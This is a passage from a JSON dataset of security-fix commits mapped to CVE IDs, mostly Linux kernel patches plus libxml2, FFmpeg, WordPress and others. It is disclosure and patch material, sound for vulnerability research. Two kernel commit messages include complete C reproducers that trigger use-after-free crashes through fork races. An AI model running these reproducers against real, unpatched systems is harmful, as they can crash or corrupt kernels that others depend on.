    "body": "There were two bugs where parameter-entity references could lead to anunexpected change of the input buffer in xmlParseNameComplex andxmlDictLookup being called with an invalid pointer.Percent sign in DTD Names=========================The NEXTL macro used to call xmlParserHandlePEReference. When parsing\"complex\" names inside the DTD, this could result in entity expansionwhich created a new input buffer. The fix is to simply remove the callto xmlParserHandlePEReference from the NEXTL macro. This is safe becauseno users of the macro require expansion of parameter entities.- xmlParseNameComplex- xmlParseNCNameComplex- xmlParseNmtokenThe percent sign is not allowed in names, which are grammatical tokens.- xmlParseEntityValueParameter-entity references in entity values are expanded but thishappens in a separate step in this function.- xmlParseSystemLiteralParameter-entity references are ignored in the system literal.- xmlParseAttValueComplex- xmlParseCharDataComplex- xmlParseCommentComplex- xmlParsePI- xmlParseCDSectParameter-entity references are ignored outside the DTD.- xmlLoadEntityContentThis function is only called from xmlStringLenDecodeEntities andentities are replaced in a separate step immediately after the functioncall.This bug could also be triggered with an internal subset and doubleentity expansion.This fixes bug 766956 initially reported by Wei Lei and independently byChromium's ClusterFuzz, Hanno Böck, and Marco Grassi. Thanks to everyoneinvolved.xmlParseNameComplex with XML_PARSE_OLD10========================================When parsing Names inside an expanded parameter entity with theXML_PARSE_OLD10 option, xmlParseNameComplex would call xmlGROW via theGROW macro if the input buffer was exhausted. At the end of theparameter entity's replacement text, this function would then callxmlPopInput which invalidated the input buffer.There should be no need to invoke GROW in this situation because thebuffer is grown periodically every XML_PARSER_CHUNK_SIZE characters and,at least for UTF-8, in xmlCurrentChar. This also matches the code pathexecuted when XML_PARSE_OLD10 is not set.This fixes bugs 781205 (CVE-2017-9049) and 781361 (CVE-2017-9050).Thanks to Marcel Böhme and Thuan Pham for the report.Additional hardening====================A separate check was added in xmlParseNameComplex to validate thebuffer size.",
    "cveIds": [
      "CVE-2017-16931"
    ],
    "cveIdsCount": 1
  },
  "08c86153d88693911251fdf1238c0d3df35787766ce42fb19ef3f5ae395b5b79": {
    "url": "https://github.com/torvalds/linux/commit/1137b5e2529a8f5ca8ee709288ecba3e68044df2",
    "title": "ipsec: Fix aborted xfrm policy dump crash",
    "body": "An independent security researcher, Mohamed Ghannam, has reportedthis vulnerability to Beyond Security's SecuriTeam Secure Disclosureprogram.The xfrm_dump_policy_done function expects xfrm_dump_policy tohave been called at least once or it will crash. This can betriggered if a dump fails because the target socket's receivebuffer is full.This patch fixes it by using the cb->start mechanism to ensure thatthe initialisation is always done regardless of the buffer situation.Fixes: 12a169e (\"ipsec: Put dumpers on the dump list\")Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>Signed-off-by: Steffen Klassert <steffen.klassert@secunet.com>",
    "cveIds": [
      "CVE-2017-16939"
    ],
    "cveIdsCount": 1
  },
  "c62220aaf7fab1c7301d4cf5c1c0dc819ccfee82941dea4ecb8a1e365fd407b6": {
    "url": "https://github.com/torvalds/linux/commit/373c4557d2aa362702c4c2d41288fb1e54990b7c",
    "title": "mm/pagewalk.c: report holes in hugetlb ranges",
    "body": "This matters at least for the mincore syscall, which will otherwise copyuninitialized memory from the page allocator to userspace. It isprobably also a correctness error for /proc/$pid/pagemap, but I haven'ttested that.Removing the `walk->hugetlb_entry` condition in walk_hugetlb_range() hasno effect because the caller already checks for that.This only reports holes in hugetlb ranges to callers who have specifieda hugetlb_entry callback.This issue was found using an AFL-based fuzzer.v2: - don't crash on ->pte_hole==NULL (Andrew Morton) - add Cc stable (Andrew Morton)Fixes: 1e25a27 (\"mincore: apply page table walker on do_mincore()\")Signed-off-by: Jann Horn <jannh@google.com>Cc: <stable@vger.kernel.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2017-16994"
    ],
    "cveIdsCount": 1
  },
  "95027cfa490f608cd87851e8690a3b3771c96ea175a2ecd0b9be47f3236ad4af": {
    "url": "https://github.com/torvalds/linux/commit/95a762e2c8c942780948091f8f2a4f32fce1ac6f",
    "title": "bpf: fix incorrect sign extension in check_alu_op()",
    "body": "Distinguish betweenBPF_ALU64|BPF_MOV|BPF_K (load 32-bit immediate, sign-extended to 64-bit)and BPF_ALU|BPF_MOV|BPF_K (load 32-bit immediate, zero-padded to 64-bit);only perform sign extension in the first case.Starting with v4.14, this is exploitable by unprivileged users as long asthe unprivileged_bpf_disabled sysctl isn't set.Debian assigned CVE-2017-16995 for this issue.v3: - add CVE number (Ben Hutchings)Fixes: 4846113 (\"bpf: allow access into map value arrays\")Signed-off-by: Jann Horn <jannh@google.com>Acked-by: Edward Cree <ecree@solarflare.com>Signed-off-by: Alexei Starovoitov <ast@kernel.org>Signed-off-by: Daniel Borkmann <daniel@iogearbox.net>",
    "cveIds": [
      "CVE-2017-16995"
    ],
    "cveIdsCount": 1
  },
  "dc400ea2b97467e4752e8321764be56f4960f5e8e96bbae28777309e95bb0402": {
    "url": "https://github.com/torvalds/linux/commit/0c17d1d2c61936401f4702e1846e2c19b200f958",
    "title": "bpf: fix incorrect tracking of register size truncation",
    "body": "Properly handle register truncation to a smaller size.The old code first mirrors the clearing of the high 32 bits in the bitwisetristate representation, which is correct. But then, it computes the newarithmetic bounds as the intersection between the old arithmetic bounds andthe bounds resulting from the bitwise tristate representation. Therefore,when coerce_reg_to_32() is called on a number with bounds[0xffff'fff8, 0x1'0000'0007], the verifier computes[0xffff'fff8, 0xffff'ffff] as bounds of the truncated number.This is incorrect: The truncated number could also be in the range [0, 7],and no meaningful arithmetic bounds can be computed in that case apart fromthe obvious [0, 0xffff'ffff].Starting with v4.14, this is exploitable by unprivileged users as long asthe unprivileged_bpf_disabled sysctl isn't set.Debian assigned CVE-2017-16996 for this issue.v2: - flip the mask during arithmetic bounds calculation (Ben Hutchings)v3: - add CVE number (Ben Hutchings)Fixes: b03c9f9 (\"bpf/verifier: track signed and unsigned min/max values\")Signed-off-by: Jann Horn <jannh@google.com>Acked-by: Edward Cree <ecree@solarflare.com>Signed-off-by: Alexei Starovoitov <ast@kernel.org>Signed-off-by: Daniel Borkmann <daniel@iogearbox.net>",
    "cveIds": [
      "CVE-2017-16996"
    ],
    "cveIdsCount": 1
  },
  "8deeb7f9d02dbe4808a783b9c152d73980ac1d3752b82ba82b2b1c1dc35a7489": {
    "url": "https://github.com/lsegal/yard/commit/b0217b3e30dc53d057b1682506333335975e62b4",
    "title": "Disallow relative paths that start with ../",
    "body": "Fixes a potential arbitrary file read vulnerability in yard server.Thanks to ztz <ztz@ztz.me> for discovery of this security issue.",
    "cveIds": [
      "CVE-2017-17042"
    ],
    "cveIdsCount": 1
  },
  "c336d006b7fbdada6273ac61f1e46da8e45b06541ea3a38d3deaa7b1a851247e": {
    "url": "https://github.com/torvalds/linux/commit/2b7e8665b4ff51c034c55df3cff76518d1a9ee3a",
    "title": "fork: fix incorrect fput of ->exe_file causing use-after-free",
    "body": "Commit 7c05126 (\"mm, fork: make dup_mmap wait for mmap_sem forwrite killable\") made it possible to kill a forking task while it iswaiting to acquire its ->mmap_sem for write, in dup_mmap().However, it was overlooked that this introduced an new error path beforea reference is taken on the mm_struct's ->exe_file. Since the->exe_file of the new mm_struct was already set to the old ->exe_file bythe memcpy() in dup_mm(), it was possible for the mmput() in the errorpath of dup_mm() to drop a reference to ->exe_file which was nevertaken.This caused the struct file to later be freed prematurely.Fix it by updating mm_init() to NULL out the ->exe_file, in the sameplace it clears other things like the list of mmaps.This bug was found by syzkaller. It can be reproduced using thefollowing C program: #define _GNU_SOURCE #include <pthread.h> #include <stdlib.h> #include <sys/mman.h> #include <sys/syscall.h> #include <sys/wait.h> #include <unistd.h> static void *mmap_thread(void *_arg) { for (;;) { mmap(NULL, 0x1000000, PROT_READ, MAP_POPULATE|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0); } } static void *fork_thread(void *_arg) { usleep(rand() % 10000); fork(); } int main(void) { fork(); fork(); fork(); for (;;) { if (fork() == 0) { pthread_t t; pthread_create(&t, NULL, mmap_thread, NULL); pthread_create(&t, NULL, fork_thread, NULL); usleep(rand() % 10000); syscall(__NR_exit_group, 0); } wait(NULL); } }No special kernel config options are needed. It usually causes a NULLpointer dereference in __remove_shared_vm_struct() during exit, or indup_mmap() (which is usually inlined into copy_process()) during fork.Both are due to a vm_area_struct's ->vm_file being used after it'salready been freed.Google Bug Id: 64772007Link: http://lkml.kernel.org/r/20170823211408.31198-1-ebiggers3@gmail.comFixes: 7c05126 (\"mm, fork: make dup_mmap wait for mmap_sem for write killable\")Signed-off-by: Eric Biggers <ebiggers@google.com>Tested-by: Mark Rutland <mark.rutland@arm.com>Acked-by: Michal Hocko <mhocko@suse.com>Cc: Dmitry Vyukov <dvyukov@google.com>Cc: Ingo Molnar <mingo@kernel.org>Cc: Konstantin Khlebnikov <koct9i@gmail.com>Cc: Oleg Nesterov <oleg@redhat.com>Cc: Peter Zijlstra <peterz@infradead.org>Cc: Vlastimil Babka <vbabka@suse.cz>Cc: <stable@vger.kernel.org>[v4.7+]Signed-off-by: Andrew Morton <akpm@linux-foundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2017-17052"
    ],
    "cveIdsCount": 1
  },
  "a82e565cd364545bc230ce3fb39caba579711412c822b70e47822bc89c060fa4": {
    "url": "https://github.com/torvalds/linux/commit/ccd5b3235180eef3cfec337df1c8554ab151b5cc",
    "title": "x86/mm: Fix use-after-free of ldt_struct",
    "body": "The following commit: 39a0526 (\"x86/mm: Factor out LDT init from context init\")renamed init_new_context() to init_new_context_ldt() and added a newinit_new_context() which calls init_new_context_ldt(). However, theerror code of init_new_context_ldt() was ignored. Consequently, if amemory allocation in alloc_ldt_struct() failed during a fork(), the->context.ldt of the new task remained the same as that of the old task(due to the memcpy() in dup_mm()). ldt_struct's are not intended to beshared, so a use-after-free occurred after one task exited.Fix the bug by making init_new_context() pass through the error code ofinit_new_context_ldt().This bug was found by syzkaller, which encountered the following splat: BUG: KASAN: use-after-free in free_ldt_struct.part.2+0x10a/0x150 arch/x86/kernel/ldt.c:116 Read of size 4 at addr ffff88006d2cb7c8 by task kworker/u9:0/3710 CPU: 1 PID: 3710 Comm: kworker/u9:0 Not tainted 4.13.0-rc4-next-20170811 #2 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011 Call Trace: __dump_stack lib/dump_stack.c:16 [inline] dump_stack+0x194/0x257 lib/dump_stack.c:52 print_address_description+0x73/0x250 mm/kasan/report.c:252 kasan_report_error mm/kasan/report.c:351 [inline] kasan_report+0x24e/0x340 mm/kasan/report.c:409 __asan_report_load4_noabort+0x14/0x20 mm/kasan/report.c:429 free_ldt_struct.part.2+0x10a/0x150 arch/x86/kernel/ldt.c:116 free_ldt_struct arch/x86/kernel/ldt.c:173 [inline] destroy_context_ldt+0x60/0x80 arch/x86/kernel/ldt.c:171 destroy_context arch/x86/include/asm/mmu_context.h:157 [inline] __mmdrop+0xe9/0x530 kernel/fork.c:889 mmdrop include/linux/sched/mm.h:42 [inline] exec_mmap fs/exec.c:1061 [inline] flush_old_exec+0x173c/0x1ff0 fs/exec.c:1291 load_elf_binary+0x81f/0x4ba0 fs/binfmt_elf.c:855 search_binary_handler+0x142/0x6b0 fs/exec.c:1652 exec_binprm fs/exec.c:1694 [inline] do_execveat_common.isra.33+0x1746/0x22e0 fs/exec.c:1816 do_execve+0x31/0x40 fs/exec.c:1860 call_usermodehelper_exec_async+0x457/0x8f0 kernel/umh.c:100 ret_from_fork+0x2a/0x40 arch/x86/entry/entry_64.S:431 Allocated by task 3700: save_stack_trace+0x16/0x20 arch/x86/kernel/stacktrace.c:59 save_stack+0x43/0xd0 mm/kasan/kasan.c:447 set_track mm/kasan/kasan.c:459 [inline] kasan_kmalloc+0xad/0xe0 mm/kasan/kasan.c:551 kmem_cache_alloc_trace+0x136/0x750 mm/slab.c:3627 kmalloc include/linux/slab.h:493 [inline] alloc_ldt_struct+0x52/0x140 arch/x86/kernel/ldt.c:67 write_ldt+0x7b7/0xab0 arch/x86/kernel/ldt.c:277 sys_modify_ldt+0x1ef/0x240 arch/x86/kernel/ldt.c:307 entry_SYSCALL_64_fastpath+0x1f/0xbe Freed by task 3700: save_stack_trace+0x16/0x20 arch/x86/kernel/stacktrace.c:59 save_stack+0x43/0xd0 mm/kasan/kasan.c:447 set_track mm/kasan/kasan.c:459 [inline] kasan_slab_free+0x71/0xc0 mm/kasan/kasan.c:524 __cache_free mm/slab.c:3503 [inline] kfree+0xca/0x250 mm/slab.c:3820 free_ldt_struct.part.2+0xdd/0x150 arch/x86/kernel/ldt.c:121 free_ldt_struct arch/x86/kernel/ldt.c:173 [inline] destroy_context_ldt+0x60/0x80 arch/x86/kernel/ldt.c:171 destroy_context arch/x86/include/asm/mmu_context.h:157 [inline] __mmdrop+0xe9/0x530 kernel/fork.c:889 mmdrop include/linux/sched/mm.h:42 [inline] __mmput kernel/fork.c:916 [inline] mmput+0x541/0x6e0 kernel/fork.c:927 copy_process.part.36+0x22e1/0x4af0 kernel/fork.c:1931 copy_process kernel/fork.c:1546 [inline] _do_fork+0x1ef/0xfb0 kernel/fork.c:2025 SYSC_clone kernel/fork.c:2135 [inline] SyS_clone+0x37/0x50 kernel/fork.c:2129 do_syscall_64+0x26c/0x8c0 arch/x86/entry/common.c:287 return_from_SYSCALL_64+0x0/0x7aHere is a C reproducer: #include <asm/ldt.h> #include <pthread.h> #include <signal.h> #include <stdlib.h> #include <sys/syscall.h> #include <sys/wait.h> #include <unistd.h> static void *fork_thread(void *_arg) { fork(); } int main(void) { struct user_desc desc = { .entry_number = 8191 }; syscall(__NR_modify_ldt, 1, &desc, sizeof(desc)); for (;;) { if (fork() == 0) { pthread_t t; srand(getpid()); pthread_create(&t, NULL, fork_thread, NULL); usleep(rand() % 10000); syscall(__NR_exit_group, 0); } wait(NULL); } }Note: the reproducer takes advantage of the fact that alloc_ldt_struct()may use vmalloc() to allocate a large ->entries array, and aftercommit: 5d17a73 (\"vmalloc: back off when the current task is killed\")it is possible for userspace to fail a task's vmalloc() bysending a fatal signal, e.g. via exit_group(). It would be moredifficult to reproduce this bug on kernels without that commit.This bug only affected kernels with CONFIG_MODIFY_LDT_SYSCALL=y.Signed-off-by: Eric Biggers <ebiggers@google.com>Acked-by: Dave Hansen <dave.hansen@linux.intel.com>Cc: <stable@vger.kernel.org> [v4.6+]Cc: Andrew Morton <akpm@linux-foundation.org>Cc: Andy Lutomirski <luto@amacapital.net>Cc: Borislav Petkov <bp@alien8.de>Cc: Brian Gerst <brgerst@gmail.com>Cc: Christoph Hellwig <hch@lst.de>Cc: Denys Vlasenko <dvlasenk@redhat.com>Cc: Dmitry Vyukov <dvyukov@google.com>Cc: Linus Torvalds <torvalds@linux-foundation.org>Cc: Michal Hocko <mhocko@suse.com>Cc: Peter Zijlstra <peterz@infradead.org>Cc: Rik van Riel <riel@redhat.com>Cc: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp>Cc: Thomas Gleixner <tglx@linutronix.de>Cc: linux-mm@kvack.orgFixes: 39a0526 (\"x86/mm: Factor out LDT init from context init\")Link: http://lkml.kernel.org/r/20170824175029.76040-1-ebiggers3@gmail.comSigned-off-by: Ingo Molnar <mingo@kernel.org>",
    "cveIds": [
      "CVE-2017-17053"
    ],
    "cveIdsCount": 1
  },
  "c00b1db3fd81c2371973cbe30d4907f92de9a4c2428952970a1bb3adf34e0909": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/58cf31cee7a456057f337b3102a03206d833d5e8",
    "title": "avcodec/x86/mpegvideodsp: Fix signedness bug in need_emu",
    "body": "Fixes: out of array readFixes: 3516/attachment-311488.datFound-by: Insu Yun, Georgia Tech.Tested-by: wuninsu@gmail.comSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2017-17081"
    ],
    "cveIdsCount": 1
  },
  "f43bc34687e03dfcefc0d1b22a8b1c852d9671a30529ab4131d0f092c352a09b": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/27f8d386829689c346ff0cef00d3af57b9fb8903",
    "title": "avcodec/x86/mpegvideodsp: Fix signedness bug in need_emu",
    "body": "Fixes: out of array readFixes: 3516/attachment-311488.datFound-by: Insu Yun, Georgia Tech.Tested-by: wuninsu@gmail.comSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>(cherry picked from commit 58cf31c)Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2017-17081"
    ],
    "cveIdsCount": 1
  },
  "2edc6d145167eb4900eba61fb4856cb6888b3b7fe061a186f4d68aee4b176aa9": {
    "url": "https://github.com/vim/vim/commit/5a73e0ca54c77e067c3b12ea6f35e3e8681e8cf8",
    "title": "patch 8.0.1263: others can read the swap file if a user is careless",
    "body": "Problem: Others can read the swap file if a user is careless with his primary group.Solution: If the group permission allows for reading but the world permissions doesn't, make sure the group is right.",
    "cveIds": [
      "CVE-2017-17087"
    ],
    "cveIdsCount": 1
  },
  "9ef14c8afecc8189bad1c7331fe0456a78d7b800db121c92c59904891ff7e02e": {
    "url": "https://github.com/WordPress/WordPress/commit/67d03a98c2cae5f41843c897f206adde299b0509",
    "title": "Hardening: Remove the ability to upload JavaScript files for users wh…",
    "body": "…o do not have the `unfiltered_html` capability.Built from https://develop.svn.wordpress.org/trunk@42261git-svn-id: http://core.svn.wordpress.org/trunk@42090 1a063a9b-81f0-0310-95a4-ce76da25c4cd",
    "cveIds": [
      "CVE-2017-17092"
    ],
    "cveIdsCount": 1
  },
  "126203294d646ba7c045ff3002084c820b26927a10828f711eb2b70a2209aee8": {
    "url": "https://github.com/WordPress/WordPress/commit/3713ac5ebc90fb2011e98dfd691420f43da6c09a",
    "title": "Hardening: Add escaping to the language attributes used on html ele…",
    "body": "…ments.Built from https://develop.svn.wordpress.org/trunk@42259git-svn-id: http://core.svn.wordpress.org/trunk@42088 1a063a9b-81f0-0310-95a4-ce76da25c4cd",
    "cveIds": [
      "CVE-2017-17093"
    ],
    "cveIdsCount": 1
  },
  "41f5254d29f2a26d3bbc9550d1d683c35f88a3000018f3827ba2f945471318a7": {
    "url": "https://github.com/WordPress/WordPress/commit/f1de7e42df29395c3314bf85bff3d1f4f90541de",
    "title": "Hardening: Ensure the attributes of enclosures are correctly escaped …",
    "body": "…in RSS and Atom feeds.Built from https://develop.svn.wordpress.org/trunk@42260git-svn-id: http://core.svn.wordpress.org/trunk@42089 1a063a9b-81f0-0310-95a4-ce76da25c4cd",
    "cveIds": [
      "CVE-2017-17094"
    ],
    "cveIdsCount": 1
  },
  "6d5e81d75958e812a05d60cb29c12f46b95ba91656f61a885eb86ed761e6ff94": {
    "url": "https://github.com/heimdal/heimdal/commit/1a6a6e462dc2ac6111f9e02c6852ddec4849b887",
    "title": "Security: Avoid NULL structure pointer member dereference",
    "body": "This can happen in the error path when processing malformed ASrequests with a NULL client name. Bug originally introduced onFri Feb 13 09:26:01 2015 +0100 in commit: a873e21 kdc: base _kdc_fast_mk_error() on krb5_mk_error_ext()Original patch by Jeffrey Altman <jaltman@secure-endpoints.com>",
    "cveIds": [
      "CVE-2017-17439"
    ],
    "cveIdsCount": 1
  },
  "efb741e1c8bb6c11a357829d87cd15a7a9d51696d256ac230736fb4437c50371": {
    "url": "https://github.com/torvalds/linux/commit/2638fd0f92d4397884fd991d8f4925cb3f081901",
    "title": "netfilter: xt_TCPMSS: add more sanity tests on tcph->doff",
    "body": "Denys provided an awesome KASAN report pointing to an useafter free in xt_TCPMSSI have provided three patches to fix this issue, either in xt_TCPMSS orin xt_tcpudp.c. It seems xt_TCPMSS patch has the smallest possibleimpact.Signed-off-by: Eric Dumazet <edumazet@google.com>Reported-by: Denys Fedoryshchenko <nuclearcat@nuclearcat.com>Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>",
    "cveIds": [
      "CVE-2017-18017"
    ],
    "cveIdsCount": 1
  },
  "f516d911ca1d452bf611545e994c27cb17b753c432a3b277eb8223809da60f05": {
    "url": "https://github.com/torvalds/linux/commit/340d394a789518018f834ff70f7534fc463d3226",
    "title": "Input: i8042 - fix crash at boot time",
    "body": "The driver checks port->exists twice in i8042_interrupt(), first whentrying to assign temporary \"serio\" variable, and second time when decidingwhether it should call serio_interrupt(). The value of port->exists maychange between the 2 checks, and we may end up calling serio_interrupt()with a NULL pointer:BUG: unable to handle kernel NULL pointer dereference at 0000000000000050IP: [<ffffffff8150feaf>] _spin_lock_irqsave+0x1f/0x40PGD 0Oops: 0002 [#1] SMPlast sysfs file:CPU 0Modules linked in:Pid: 1, comm: swapper Not tainted 2.6.32-358.el6.x86_64 #1 QEMU Standard PC (i440FX + PIIX, 1996)RIP: 0010:[<ffffffff8150feaf>] [<ffffffff8150feaf>] _spin_lock_irqsave+0x1f/0x40RSP: 0018:ffff880028203cc0 EFLAGS: 00010082RAX: 0000000000010000 RBX: 0000000000000000 RCX: 0000000000000000RDX: 0000000000000282 RSI: 0000000000000098 RDI: 0000000000000050RBP: ffff880028203cc0 R08: ffff88013e79c000 R09: ffff880028203ee0R10: 0000000000000298 R11: 0000000000000282 R12: 0000000000000050R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000098FS: 0000000000000000(0000) GS:ffff880028200000(0000) knlGS:0000000000000000CS: 0010 DS: 0018 ES: 0018 CR0: 000000008005003bCR2: 0000000000000050 CR3: 0000000001a85000 CR4: 00000000001407f0DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400Process swapper (pid: 1, threadinfo ffff88013e79c000, task ffff88013e79b500)Stack:ffff880028203d00 ffffffff813de186 ffffffffffffff02 0000000000000000<d> 0000000000000000 0000000000000000 0000000000000000 0000000000000098<d> ffff880028203d70 ffffffff813e0162 ffff880028203d20 ffffffff8103b8acCall Trace:<IRQ> [<ffffffff813de186>] serio_interrupt+0x36/0xa0[<ffffffff813e0162>] i8042_interrupt+0x132/0x3a0[<ffffffff8103b8ac>] ? kvm_clock_read+0x1c/0x20[<ffffffff8103b8b9>] ? kvm_clock_get_cycles+0x9/0x10[<ffffffff810e1640>] handle_IRQ_event+0x60/0x170[<ffffffff8103b154>] ? kvm_guest_apic_eoi_write+0x44/0x50[<ffffffff810e3d8e>] handle_edge_irq+0xde/0x180[<ffffffff8100de89>] handle_irq+0x49/0xa0[<ffffffff81516c8c>] do_IRQ+0x6c/0xf0[<ffffffff8100b9d3>] ret_from_intr+0x0/0x11[<ffffffff81076f63>] ? __do_softirq+0x73/0x1e0[<ffffffff8109b75b>] ? hrtimer_interrupt+0x14b/0x260[<ffffffff8100c1cc>] ? call_softirq+0x1c/0x30[<ffffffff8100de05>] ? do_softirq+0x65/0xa0[<ffffffff81076d95>] ? irq_exit+0x85/0x90[<ffffffff81516d80>] ? smp_apic_timer_interrupt+0x70/0x9b[<ffffffff8100bb93>] ? apic_timer_interrupt+0x13/0x20To avoid the issue let's change the second check to test whether serio isNULL or not.Also, let's take i8042_lock in i8042_start() and i8042_stop() instead oftrying to be overly smart and using memory barriers.Signed-off-by: Chen Hong <chenhong3@huawei.com>[dtor: take lock in i8042_start()/i8042_stop()]Cc: stable@vger.kernel.orgSigned-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>",
    "cveIds": [
      "CVE-2017-18079"
    ],
    "cveIdsCount": 1
  },
  "8a8b3e419472e4730323172ed84d3aad9dae92e82bde5c8610cbccdc063f0d73": {
    "url": "https://github.com/ARMmbed/mbedtls/commit/83c9f495ffe70c7dd280b41fdfd4881485a3bc28",
    "title": "Prevent bounds check bypass through overflow in PSK identity parsing",
    "body": "The check `if( *p + n > end )` in `ssl_parse_client_psk_identity` isunsafe because `*p + n` might overflow, thus bypassing the check. As`n` is a user-specified value up to 65K, this is relevant if thelibrary happens to be located in the last 65K of virtual memory.This commit replaces the check by a safe version.",
    "cveIds": [
      "CVE-2017-18187"
    ],
    "cveIdsCount": 1
  },
  "c1e60e092702ae4dc729a38449bac647e76c11b5a5efb1e608f6e7cf45c0621a": {
    "url": "https://github.com/torvalds/linux/commit/dad48e73127ba10279ea33e6dbc8d3905c4d31c0",
    "title": "f2fs: fix a bug caused by NULL extent tree",
    "body": "Thread A:Thread B:-f2fs_remount -sbi->mount_opt.opt = 0;<--- -f2fs_iget -do_read_inode -f2fs_init_extent_tree -F2FS_I(inode)->extent_tree is NULL -default_options && parse_options -remount return<--- -f2fs_map_blocks -f2fs_lookup_extent_tree -f2fs_bug_on(sbi, !et);The same problem with f2fs_new_inode.Signed-off-by: Yunlei He <heyunlei@huawei.com>Signed-off-by: Jaegeuk Kim <jaegeuk@kernel.org>",
    "cveIds": [
      "CVE-2017-18193"
    ],
    "cveIdsCount": 1
  },
  "4cce94a61193f4f65c5f7da498feb699c835f89b35d265a1bc38e0572aeeefe0": {
    "url": "https://github.com/torvalds/linux/commit/638164a2718f337ea224b747cf5977ef143166a4",
    "title": "f2fs: fix potential panic during fstrim",
    "body": "As Ju Hyung Park reported:\"When 'fstrim' is called for manual trim, a BUG() can be triggeredrandomly with this patch.I'm seeing this issue on both x86 Desktop and arm64 Android phone.On x86 Desktop, this was caused during Ubuntu boot-up. I have acronjob installed which calls 'fstrim -v /' during boot. On arm64Android, this was caused during GC looping with 1ms gc_min_sleep_time& gc_max_sleep_time.\"Root cause of this issue is that f2fs_wait_discard_bios can only beused by f2fs_put_super, because during put_super there must be noother referrers, so it can ignore discard entry's reference countwhen removing the entry, otherwise in other caller we will hit bug_onin __remove_discard_cmd as there may be other issuer added referencecount in discard entry.Thread AThread B- issue_discard_thread- f2fs_ioc_fitrim - f2fs_trim_fs - f2fs_wait_discard_bios - __issue_discard_cmd - __submit_discard_cmd - __wait_discard_cmd - dc->ref++ - __wait_one_discard_bio - __wait_discard_cmd - __remove_discard_cmd - f2fs_bug_on(sbi, dc->ref)Fixes: 969d1b1Reported-by: Ju Hyung Park <qkrwngud825@gmail.com>Signed-off-by: Chao Yu <yuchao0@huawei.com>Signed-off-by: Jaegeuk Kim <jaegeuk@kernel.org>",
    "cveIds": [
      "CVE-2017-18200"
    ],
    "cveIdsCount": 1
  },
  "2720a21c084e7e801ec7efdf2b433b46dcfb64a7cdc251765ab82c96d85e0304": {
    "url": "https://github.com/torvalds/linux/commit/687cb0884a714ff484d038e9190edc874edcf146",
    "title": "mm, oom_reaper: gather each vma to prevent leaking TLB entry",
    "body": "tlb_gather_mmu(&tlb, mm, 0, -1) means gathering the whole virtual memoryspace. In this case, tlb->fullmm is true. Some archs like arm64doesn't flush TLB when tlb->fullmm is true: commit 5a7862e (\"arm64: tlbflush: avoid flushing when fullmm == 1\").Which causes leaking of tlb entries.Will clarifies his patch: \"Basically, we tag each address space with an ASID (PCID on x86) which is resident in the TLB. This means we can elide TLB invalidation when pulling down a full mm because we won't ever assign that ASID to another mm without doing TLB invalidation elsewhere (which actually just nukes the whole TLB). I think that means that we could potentially not fault on a kernel uaccess, because we could hit in the TLB\"There could be a window between complete_signal() sending IPI to othercores and all threads sharing this mm are really kicked off from cores.In this window, the oom reaper may calls tlb_flush_mmu_tlbonly() toflush TLB then frees pages. However, due to the above problem, the TLBentries are not really flushed on arm64. Other threads are possible toaccess these pages through TLB entries. Moreover, a copy_to_user() canalso write to these pages without generating page fault, causesuse-after-free bugs.This patch gathers each vma instead of gathering full vm space. In thiscase tlb->fullmm is not true. The behavior of oom reaper become similarto munmapping before do_exit, which should be safe for all archs.Link: http://lkml.kernel.org/r/20171107095453.179940-1-wangnan0@huawei.comFixes: aac4536 (\"mm, oom: introduce oom reaper\")Signed-off-by: Wang Nan <wangnan0@huawei.com>Acked-by: Michal Hocko <mhocko@suse.com>Acked-by: David Rientjes <rientjes@google.com>Cc: Minchan Kim <minchan@kernel.org>Cc: Will Deacon <will.deacon@arm.com>Cc: Bob Liu <liubo95@huawei.com>Cc: Ingo Molnar <mingo@kernel.org>Cc: Roman Gushchin <guro@fb.com>Cc: Konstantin Khlebnikov <khlebnikov@yandex-team.ru>Cc: Andrea Arcangeli <aarcange@redhat.com>Cc: <stable@vger.kernel.org>Signed-off-by: Andrew Morton <akpm@linux-foundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2017-18202"
    ],
    "cveIdsCount": 1
  },
  "054fed61f392e6466c94e20728ebf4d9e6e2a12a76485027729687ec98140c89": {
    "url": "https://github.com/torvalds/linux/commit/853bc26a7ea39e354b9f8889ae7ad1492ffa28d2",
    "title": "ocfs2: subsystem.su_mutex is required while accessing the item->ci_pa…",
    "body": "…rentThe subsystem.su_mutex is required while accessing the item->ci_parent,otherwise, NULL pointer dereference to the item->ci_parent will betriggered in the following situation:add node delete nodesys_write vfs_write configfs_write_file o2nm_node_store o2nm_node_local_write do_rmdir vfs_rmdir configfs_rmdir mutex_lock(&subsys->su_mutex); unlink_obj item->ci_group = NULL; item->ci_parent = NULL; to_o2nm_cluster_from_node node->nd_item.ci_parent->ci_parent BUG since of NULL pointer dereference to nd_item.ci_parentMoreover, the o2nm_cluster also should be protected by thesubsystem.su_mutex.[alex.chen@huawei.com: v2] Link: http://lkml.kernel.org/r/59EEAA69.9080703@huawei.comLink: http://lkml.kernel.org/r/59E9B36A.10700@huawei.comSigned-off-by: Alex Chen <alex.chen@huawei.com>Reviewed-by: Jun Piao <piaojun@huawei.com>Reviewed-by: Joseph Qi <jiangqi903@gmail.com>Cc: Mark Fasheh <mfasheh@versity.com>Cc: Joel Becker <jlbec@evilplan.org>Cc: Junxiao Bi <junxiao.bi@oracle.com>Signed-off-by: Andrew Morton <akpm@linux-foundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2017-18216"
    ],
    "cveIdsCount": 1
